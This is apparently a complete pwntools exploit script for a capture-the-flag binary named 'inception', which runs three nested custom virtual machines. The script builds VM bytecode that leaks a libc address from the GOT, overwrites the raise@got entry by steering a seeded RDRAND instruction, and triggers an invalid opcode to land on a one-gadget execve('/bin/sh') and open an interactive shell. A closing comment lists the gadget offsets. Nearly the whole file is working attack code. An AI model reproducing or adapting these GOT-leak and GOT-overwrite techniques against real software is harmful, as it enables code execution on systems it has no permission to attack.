from pwn import *
from struct import pack
from ctypes import *


###############################################################################
#### Init (copied from disconnect3d template)                              ####
###############################################################################
e = context.binary = ELF('./inception')
libc = ELF('/lib/x86_64-linux-gnu/libc-2.27.so')

# Assumes default x64 program base. Make sure 
# /proc/sys/kernel/randomize_va_space is set to 0
# or program has been called with NOASLR argument
gdbscript = '''
b *0x55555555702f
b *0x555555555FA8
b *0x555555554F94
b *0x0000555555555ABD
c

set $vm1_mem =  0x0000555555779140
set $vm1_regs = 0x0000555555789140
set $vm2_mem =  0x0000555555769100
set $vm2_regs = 0x0000555555779100
set $vm3_mem =  0x00005555557590C0
set $vm3_regs = 0x00005555557690C0

define vm1_state
    print "VM1 STATE:"
    print "registers: "
    x/14hx $vm1_regs
    print "code  segment [0x0, 0x3fff]"
    x/8gx $vm1_mem
    print "extra segment r [0x7000-0x7fff]"
    x/8gx $vm1_mem + 0x7000
    print "extra segment w [0x8000-0x8fff]"
    x/8gx $vm1_mem + 0x8000
end

define vm2_state
    print "VM2 STATE:"
    print "registers: "
    x/14wx $vm2_regs
    print "code  segment [0x0, 0x3fff]"
    x/8gx $vm2_mem
    print "extra segment r [0x7000-0x7fff]"
    x/8gx $vm2_mem + 0x7000
    print "extra segment w [0x8000-0x8fff]"
    x/8gx $vm2_mem + 0x8000
end

define vm3_state
    print "VM3 STATE:"
    print "registers: "
    x/14hx $vm3_regs
    print "code  segment [0x0, 0x3fff]"
    x/8gx $vm3_mem
    print "extra segment r [0x7000-0x7fff]"
    x/8gx $vm3_mem + 0x7000
    print "extra segment w [0x8000-0x8fff]"
    x/8gx $vm3_mem + 0x8000
end
'''

def local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([e.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([e.path] + argv, *a, **kw)

def remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    host = 'this is an old challenge'
    port = 1337
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return local(argv, *a, **kw)
    else:
        return remote(argv, *a, **kw)

p = start()
context.log_level = 'debug'



###############################################################################
#### Constants                                                            #####
###############################################################################
RUN_VM1              = b'\x01'
RUN_VM2              = b'\x02'
RUN_VM3              = b'\x03'
RESET_VM1            = b'\x04'
RESET_VM2            = b'\x05'
RESET_VM3            = b'\x06'

OPERAND_REG          = 0
OPERAND_IMM          = 1
OPERAND_MEM          = 2
OPERAND_STACK        = 3
OP_WORD              = 32
OP_UNUSED            = 0

DS_INIT_VAL = 0x400
SS_INIT_VAL = 0x900
ES_INIT_VAL = 0x700


VM1_OPCODE_NOP       = b'\x90'
VM1_OPCODE_MOV       = b'\x89'
VM1_OPCODE_ADD       = b'\x01'
VM1_OPCODE_SUB       = b'\x29'
VM1_OPCODE_XOR       = b'\x31'
VM1_OPCODE_MUL       = b'\xf6'
VM1_OPCODE_DIV       = b'\xf7'
VM1_OPCODE_PUSH_WORD = b'\x50'
VM1_OPCODE_POP_WORD  = b'\x57'
VM1_OPCODE_PUSH_BYTE = b'\x51'
VM1_OPCODE_POP_BYTE  = b'\x58'
VM1_OPCODE_HLT       = b'\xf4'
VM1_OPCODE_OUT       = b'\x0b'
VM1_OPCODE_IN        = b'\x0c'
VM1_OPCODE_CMP_WORD  = b'\x38'
VM1_OPCODE_CMP_BYTE  = b'\x39'
VM1_OPCODE_CALL      = b'\xe8'
VM1_OPCODE_RET       = b'\xc3'
VM1_OPCODE_JE        = b'\x4f'
VM1_OPCODE_JNE       = b'\x5f'
VM1_OPCODE_JMP       = b'\xe9'

VM1_REG_AX    = 0
VM1_REG_BX    = 1
VM1_REG_CX    = 2
VM1_REG_DX    = 3
VM1_REG_CS    = 4
VM1_REG_DS    = 5
VM1_REG_SS    = 6
VM1_REG_ES    = 7
VM1_REG_SI    = 8
VM1_REG_DI    = 9
VM1_REG_BP    = 10
VM1_REG_SP    = 11
VM1_REG_FLAGS = 12
VM1_REG_IP    = 13
VM1_GPREG_COUNT = 11

VM2_OPCODE_NOP       = b'\x92'
VM2_OPCODE_MOV       = b'\x28'
VM2_OPCODE_ADD       = b'\x82'
VM2_OPCODE_SUB       = b'\xb4'
VM2_OPCODE_XOR       = b'\x29'
VM2_OPCODE_MUL       = b'\x60'
VM2_OPCODE_DIV       = b'\x7e'
VM2_OPCODE_PUSH_WORD = b'\x88'
VM2_OPCODE_POP_WORD  = b'\x20'
VM2_OPCODE_PUSH_BYTE = b'\x93'
VM2_OPCODE_POP_BYTE  = b'\xda'
VM2_OPCODE_HLT       = b'\x83'
VM2_OPCODE_OUT       = b'\x85'
VM2_OPCODE_IN        = b'\xdb'
VM2_OPCODE_CMP_WORD  = b'\xec'
VM2_OPCODE_CMP_BYTE  = b'\x04'
VM2_OPCODE_CALL      = b'\x8a'
VM2_OPCODE_RET       = b'\xbc'
VM2_OPCODE_FAR_RET   = b'\xbd'
VM2_OPCODE_JE        = b'\x51'
VM2_OPCODE_JNE       = b'\x57'
VM2_OPCODE_JMP       = b'\x75'
VM2_OPCODE_STOSB     = b'\xc0'
VM2_OPCODE_MOVSB     = b'\xc1'

VM2_REG_AX    = 11
VM2_REG_BX    = 3
VM2_REG_CX    = 13
VM2_REG_DX    = 5
VM2_REG_CS    = 8
VM2_REG_DS    = 10
VM2_REG_SS    = 1
VM2_REG_ES    = 7
VM2_REG_SI    = 0
VM2_REG_DI    = 2
VM2_REG_BP    = 12
VM2_REG_SP    = 9
VM2_REG_FLAGS = 4
VM2_REG_IP    = 6

VM2_MEM_BASE = 0x215100

VM3_OPCODE_NOP       = 0
VM3_OPCODE_MOV       = 1
VM3_OPCODE_ADD       = 2
VM3_OPCODE_SUB       = 3
VM3_OPCODE_XOR       = 4
VM3_OPCODE_MUL       = 5
VM3_OPCODE_DIV       = 6
VM3_OPCODE_PUSH_WORD = 7
VM3_OPCODE_POP_WORD  = 8
VM3_OPCODE_PUSH_BYTE = 9
VM3_OPCODE_POP_BYTE  = 10
VM3_OPCODE_HLT       = 11
VM3_OPCODE_OUT       = 12
VM3_OPCODE_IN        = 13
VM3_OPCODE_CMP_WORD  = 14
VM3_OPCODE_CMP_BYTE  = 15
VM3_OPCODE_CALL      = 16
VM3_OPCODE_RET       = 17
VM3_OPCODE_JE        = 18
VM3_OPCODE_JNE       = 19
VM3_OPCODE_JMP       = 20
VM3_OPCODE_RDRAND    = 21
VM3_INVALID_OPCODE   = 22

VM3_REG_AX    = 10
VM3_REG_BX    = 6
VM3_REG_CX    = 1
VM3_REG_DX    = 2
VM3_REG_CS    = 9
VM3_REG_DS    = 3
VM3_REG_SS    = 0
VM3_REG_ES    = 4
VM3_REG_SI    = 13
VM3_REG_DI    = 11
VM3_REG_BP    = 8
VM3_REG_SP    = 7
VM3_REG_FLAGS = 12
VM3_REG_IP    = 5

VM3_OP1_TYPE  = 3 << 8
VM3_OP1_REG   = 1 << 8
VM3_OP1_IMM   = 2 << 8
VM3_OP1_MEM   = 3 << 8

VM3_OP1_SIZE  = 3 << 10
VM3_OP1_WORD  = 1 << 10
VM3_OP1_BYTE  = 2 << 10

VM3_OP2_TYPE  = 3 << 12
VM3_OP2_REG   = 1 << 12
VM3_OP2_IMM   = 2 << 12
VM3_OP2_MEM   = 3 << 12

VM3_OP2_SIZE  = 3 << 14
VM3_OP2_WORD  = 1 << 14
VM3_OP2_BYTE  = 2 << 14

VM3_MEM_BASE = 0x2050c0


###############################################################################
#### VM1 Helper functions                                                 #####
###############################################################################
def vm1_read_from_ofst(count, ofst):
    '''Returns a sequence of instructions which will print out count bytes
    starting at &mem[ofst].'''
    code = b''
    
    # First change regs[7] to ofst.
    code += vm1_set_reg(7, int(ofst / 16))

    # Set reg[0] to count
    code += vm1_set_reg(0, count)

    # And now trigger write flag
    code += vm1_set_out_flag()

    return code


def vm1_write_at_ofst(count, ofst):
    '''Returns a sequence of instructions which will write bstr
    starting at &mem[ofst].'''
    code = b''

    # First change regs[7] to point to ofst-0x1000
    code += vm1_set_reg(7, int((ofst-0x1000) / 16))

    # Set reg[0] to count
    code += vm1_set_reg(0, count)

    # And now trigger read flag
    code += vm1_set_in_flag()

    return code


def vm1_set_out_flag():
    '''Sets write flag'''
    code = VM1_OPCODE_OUT \
        + pack('<b', 0)
    return code


def vm1_set_in_flag():
    '''Sets read flag'''
    code = VM1_OPCODE_IN \
        + pack('<b', 0)
    return code


def vm1_set_reg(reg, val):
    '''Sets vm1_regs[reg] = val.'''
    code = VM1_OPCODE_MOV \
        + pack('<b', 2) \
        + pack('<b', OP_WORD | OPERAND_REG) + pack('<h', reg) \
        + pack('<b', OP_WORD | OPERAND_IMM) + pack('<h', val)   
    return code



def vm1_mark_no_more_instructions():
    '''Marks that there is no more instructions so we can exit gracefully'''
    code = VM1_OPCODE_HLT \
        + pack('<b', 0)
    return code



###############################################################################
#### VM2 Helper functions                                                 #####
###############################################################################
def vm2_set_reg(reg, val):
    '''Sets vm2_regs[reg] = val.'''
    code = VM2_OPCODE_MOV \
         + pack('<l', reg) + pack('<b', OP_WORD | OPERAND_REG) \
         + pack('<l', val) + pack('<b', OP_WORD | OPERAND_IMM)
    return code


def vm2_mark_no_more_instructions():
    '''Halt vm2 gracefully.'''
    code = VM2_OPCODE_HLT \
        + pack('<l', 0) + pack('<b', OP_UNUSED) \
        + pack('<l', 0) + pack('<b', OP_UNUSED)
    return code


###############################################################################
#### VM3 Helper functions                                                 #####
###############################################################################
def vm3_set_reg(reg, val):
    '''Sets vm3_regs[reg] = val.'''
    code = pack('<h', VM3_OPCODE_MOV | VM3_OP1_WORD | VM3_OP1_REG | VM3_OP2_WORD | VM3_OP2_IMM) \
        + pack('<h', reg) \
        + pack('<h', val)
    return code


###############################################################################
#### Exploit                                                              #####
###############################################################################
# 1) Leak setvbuf libc address from got table by abusing VM2 POP_WORD 
# instruction.
# 2) Overwrite raise entry in got table using RDRAND instruction with address
# to one gadget
# 3) Provide some invalid instruction to trigger raise and to get a shell
###############################################################################


def leak_libc_base():
    log.info("** Starting Leak Libc phase...")

    payload = b''
    vm1_code = b''
    vm11_code = b''
    vm2_code = b''

    # Set sp so we can read from got table.
    # vm2_mem[ss * 16 + sp] = got@setvbuf
    new_sp = e.got['setvbuf'] - (VM2_MEM_BASE + 16 * SS_INIT_VAL)
    vm2_code += vm2_set_reg(VM2_REG_SP, new_sp)

    # Set ds so that pop will place the poped value inside
    # extra segment from where vm1 can read
    vm2_code += vm2_set_reg(VM2_REG_DS, ES_INIT_VAL)
    
    # Copy value from got@setvbuf to extra segment. We can copy 4 bytes
    # at a time so perform pop instruction twice.
    vm2_code += VM2_OPCODE_POP_WORD \
        + pack('<l', 0) + pack('<b', OP_WORD | OPERAND_MEM) \
        + pack('<l', 0) + pack('<b', OP_UNUSED)
    vm2_code += VM2_OPCODE_POP_WORD \
        + pack('<l', 4) + pack('<b', OP_WORD | OPERAND_MEM) \
        + pack('<l', 0) + pack('<b', OP_UNUSED)

    # Now trigger out flag to push the leaked setvbuf address
    # to vm1 extra segment memory space( vm1_mem[0x8000, 0x8008] ).
    vm2_code += vm2_set_reg(VM2_REG_AX, 8)
    vm2_code += VM2_OPCODE_OUT \
        + pack('<l', 0) + pack('<b', OP_UNUSED) \
        + pack('<l', 0) + pack('<b', OP_UNUSED)

    vm2_code += vm2_mark_no_more_instructions()


    # Ok, but first we must upload the code to extra segment
    vm1_code += vm1_write_at_ofst(len(vm2_code), ES_INIT_VAL * 16)
    vm1_code += vm1_mark_no_more_instructions()

    # And finally we are able to write out the leaked address
    vm11_code += vm1_read_from_ofst(8, 0x8000)
    vm11_code += vm1_mark_no_more_instructions()

    payload += RUN_VM1 \
        + pack('<l', len(vm1_code)) + vm1_code \
        + pack('<l', len(vm2_code)) + vm2_code \
        + RUN_VM2 \
        + RESET_VM1 + RESET_VM2 \
        + RUN_VM1 \
        + pack('<l', len(vm11_code)) + vm11_code \
        + RESET_VM1 + RESET_VM2

    p.send(payload)

    # Now retrieve the leaked address.
    p.recvuntil(b'Z\nZ\nZ\nA\n')
    libc_setvbuf = u64(p.recv(8))
    log.info(f"Leaked libc_setvbuf: {hex(libc_setvbuf)}")
    libc_base = libc_setvbuf - libc.symbols['setvbuf']
    log.info(f"Calculated libc_base: {hex(libc_base)}")
    return libc_base


def run_vm3(vm3_code):
    '''Runs vm3 on provided input. This requires passing the code from stdin via vm1 and vm2.'''
    payload = b''

    # Pass code from vm2 to vm3
    # First set es so that invoked readAll_vm1 will copy
    # vm1_mem[0x7000, 0x7fff] to vm2_mem[0x6f00, 0x7e00]
    # where vm2_mem[0x6f00, 0x7000] = vm2_code and
    # vm2_mem[0x7000, 0x7f00] = vm3_code
    vm2_code = vm2_set_reg(VM2_REG_ES, 0x5f0)
    vm2_code += VM2_OPCODE_IN \
        + pack('<l', 0) + pack('<b', OP_UNUSED) \
        + pack('<l', 0) + pack('<b', OP_UNUSED)
    vm2_code += vm2_mark_no_more_instructions()
    vm2_code = vm2_code.ljust(0x100, b'\x41')


    # Pass code from vm1 to vm2 and load code for vm2.
    # vm1_mem[0x7000, 0x7fff] = vm2_code || vm3_code
    vm1_code = vm1_write_at_ofst(len(vm2_code) + len(vm3_code), ES_INIT_VAL * 16)
    vm1_code += vm1_mark_no_more_instructions()

    payload += RUN_VM1 \
        + pack('<l', len(vm1_code)) + vm1_code \
        + pack('<l', len(vm2_code) + len(vm3_code)) + vm2_code + vm3_code \
        + RUN_VM2 + RUN_VM3
    p.send(payload)


def generate_vm3_code(cookie):
    '''Generates code which will overwrite raise@got entry with provided cookie.
    This abuses the fact that we know seed for pseudo random number generator and 
    we can use RDRAND instruction to write anywhere we want.'''

    vm3_code = b''

    # First set di register so that VM3_MEM_BASE + ds * 16 + di == raise@got
    new_di = e.got['raise'] - DS_INIT_VAL * 16 - VM3_MEM_BASE
    vm3_code += vm3_set_reg(VM3_REG_DI, new_di)

    clibc = CDLL('/lib/x86_64-linux-gnu/libc-2.27.so')
    clibc.srand(0x31337) # provide same seed
    
    for b in cookie:
        while 1:
            r = clibc.rand() & 0xff
            vm3_code += pack('<h', VM3_OPCODE_RDRAND)
            if r == b:
                # We found correct byte so proceed to next byte
                new_di += 1
                vm3_code += vm3_set_reg(VM3_REG_DI, new_di)
                break
    vm3_code += pack('<h', VM3_INVALID_OPCODE)
    return vm3_code



if __name__ == '__main__':
    leaked_libc_base = leak_libc_base()
    one_gadget = leaked_libc_base + 0x4f3c2
    one_gadget_bstr = p64(one_gadget)[:-2]
    log.info(f"[i] gadget address: {hex(one_gadget)}")
    vm3_code = generate_vm3_code(one_gadget_bstr)
    log.info(f"vm3_code len: {len(vm3_code)}")
    run_vm3(vm3_code)

    p.interactive()






'''
Segmentation:
code_segment:    [0x0   , 0x3fff]
data_segment:    [0x4000, 0x6fff]
extra_segment_r: [0x7000, 0x7fff]
extra_segment_w: [0x8000, 0x8fff]
stack_segment:   [0x9000, 0xffff]

And some useful addresses for debugging.

$ one_gadget /lib/x86_64-linux-gnu/libc-2.27.so
0x4f365 execve("/bin/sh", rsp+0x40, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL

0x4f3c2 execve("/bin/sh", rsp+0x40, environ)
constraints:
  [rsp+0x40] == NULL

0x10a45c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL

'''













